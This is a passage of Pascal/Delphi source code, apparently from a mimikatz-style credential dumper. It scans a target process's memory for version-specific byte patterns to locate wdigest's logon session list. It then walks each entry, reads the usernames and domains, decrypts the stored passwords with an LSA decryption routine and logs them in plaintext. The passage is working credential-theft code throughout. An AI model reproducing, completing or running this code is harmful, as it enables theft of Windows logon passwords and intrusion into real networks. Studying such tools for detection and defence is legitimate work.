  bytes:array[0..254] of byte;
  password,decrypted:tbytes;
  username,domain:array [0..254] of widechar;
begin
  if pid=0 then exit;
  //if user='' then exit;
  //
  if (lowercase(osarch)='amd64') then
     begin
     if copy(winver,1,2)='5' then
        begin
        setlength(pattern,sizeof(PTRN_WIN5_PasswdSet));
        copymemory(@pattern[0],@PTRN_WIN5_PasswdSet[0],sizeof(PTRN_WIN5_PasswdSet));
        end
        else
        begin
        setlength(pattern,sizeof(PTRN_WIN6_PasswdSet));
        copymemory(@pattern[0],@PTRN_WIN6_PasswdSet[0],sizeof(PTRN_WIN6_PasswdSet));
        end;
     //{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN1703_LogonSessionList),	PTRN_WN1703_LogonSessionList},	{0, NULL}, {23,  -4}}
     patch_pos:=23;
     //{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN63_LogonSessionList),	PTRN_WN63_LogonSessionList},	{0, NULL}, {36,  -6}},
     patch_pos:=36;
     //{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_PasswdSet),	PTRN_WIN5_PasswdSet},	{0, NULL}, {-4, 36}},
     //{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WIN5_PasswdSet),	PTRN_WIN5_PasswdSet},	{0, NULL}, {-4, 48}},
     //{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WIN6_PasswdSet),	PTRN_WIN6_PasswdSet},	{0, NULL}, {-4, 48}},
     patch_pos:=-4;
     end;
  if (lowercase(osarch)='x86') then
     begin
        setlength(pattern,7);
          if copy(winver,1,3)='5.1' then copymemory(@pattern[0],@PTRN_WIN5_PasswdSet_X86[0],7);
          //vista - 6.0
          if (copy(winver,1,3)='6.0')
             or (copy(winver,1,3)='6.1')
             or (copy(winver,1,3)='6.2') then copymemory(@pattern[0],@PTRN_WIN6_PasswdSet_X86[0],7);
          //win 8.1 6.3
          if copy(winver,1,3)='6.3' then copymemory(@pattern[0],@PTRN_WIN63_PasswdSet_X86[0],7);
          //generic for now
          patch_pos:=-6;
     end;


  if symmode=true then
     begin
       try
       if _SymFromName (strpas(sysdir)+'\'+module,'l_LogSessList',offset)
          then
             begin
             log('_SymFromName:'+inttohex(offset,sizeof(offset)));
             patch_pos:=-1;
             end
          else log('_SymFromName:failed');
       except
       on e:exception do log(e.Message );
       end;
     end;

  if patch_pos =0 then
     begin
     log('no patch mod for this windows version',1);
     exit;
     end;
  log('patch pos:'+inttostr(patch_pos ),0);
  //
  if search_module_mem (pid,module,pattern,offset)=false then
     begin
     log('search_module_mem NOT OK');
     exit;
     end;
   //
  if offset=0 then exit;
  log('found:'+inttohex(offset,sizeof(pointer)),0);
  //
  hprocess:=thandle(-1);
  hprocess:=openprocess( PROCESS_VM_READ {or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION},
                                        false,pid);
  if hprocess<>thandle(-1) then
       begin
       log('openprocess ok',0);

       if patch_pos =-1 then //relative offset was provided
       begin
       //nothing to do here...
       end;

       //
       if patch_pos <>-1 then  //some more work to find the relative offset
       if ReadMem  (hprocess,offset+patch_pos,@offset_list_dword,sizeof(offset_list_dword)) then
       begin
       //CopyMemory(@offset_list_dword,@offset_list[0],4);
       log('ReadProcessMemory OK '+inttohex(offset_list_dword{$ifdef CPU64}+4{$endif CPU64},4));
       //we now should get a match with .load wdigest.dll then dd wdigest!l_LogSessList
       //new offset to the list entry
       {$ifdef CPU64}
       offset:= offset+offset_list_dword+4+patch_pos;
       {$endif CPU64}
       {$ifdef CPU32}
       offset:= offset_list_dword{+patch_pos};
       {$endif CPU32}
       end; //if readmem

               //finally do the work
               log('offset l_LogSessList:'+leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0'),0);
               //read sesslist at offset
               ReadMem  (hprocess,offset,logsesslist );
               dummy:=inttohex(i_logsesslist (logsesslist ).next,sizeof(pointer));
               //lets skip the first one
               ReadMem  (hprocess,i_logsesslist (logsesslist).next,logsesslist );
               //lets loop
               //while dummy<>leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0') do
               //while dummy<>inttohex(offset,sizeof(pointer)) do
               while i_logsesslist (logsesslist).next<>offset do
               begin
               log('entry#this:'+inttohex(i_logsesslist (logsesslist ).this ,sizeof(pointer)),0) ;
               log('entry#next:'+dummy,0) ;
               log('usagecount:'+inttostr(i_logsesslist (logsesslist ).usagecount),1) ;
               //get username
               if ReadMem  (hprocess,i_logsesslist (logsesslist ).usernameptr,bytes )
               //copymemory(@username[0],@bytes[0],64);
                  then log('username:'+strpas (pwidechar(@bytes[0])),1);
               //get domain
               if ReadMem  (hprocess,i_logsesslist (logsesslist ).domainptr,bytes )
               //copymemory(@domain[0],@bytes[0],64);
                  then log('domain:'+strpas (pwidechar(@bytes[0])),1);
               //
               log('pwdlen:'+inttostr(i_logsesslist (logsesslist ).maxlen3),1) ;
               if (i_logsesslist (logsesslist ).maxlen3>0) and (i_logsesslist (logsesslist ).usagecount>0) then
                 begin
                 setlength(password,i_logsesslist (logsesslist ).maxlen3);
                 ReadMem  (hprocess,i_logsesslist (logsesslist ).passwordptr ,@password[0],i_logsesslist (logsesslist ).maxlen3 );
                 setlength(decrypted,1024);
                 if decryptLSA (i_logsesslist (logsesslist ).maxlen3,password,decrypted)=true
                    then log('Password:'+strpas (pwidechar(@decrypted[0]) ),1);
                 end;
               //decryptcreds;
               //next
               ReadMem  (hprocess,i_logsesslist (logsesslist).next,logsesslist );
               dummy:=inttohex(i_logsesslist (logsesslist).next,sizeof(pointer));
               end; //while
               //



                {//test - lets read first 4 bytes of our module
                 //can be verified with process hacker
                if ReadProcessMemory( hprocess,addr,@buffer[0],4,@read) then
                   begin
                   log('ReadProcessMemory OK');
                   log(inttohex(buffer[0],1)+inttohex(buffer[1],1)+inttohex(buffer[2],1)+inttohex(buffer[3],1));
                   end;
                }

       closehandle(hprocess);
       end;//if openprocess...

end;


end.

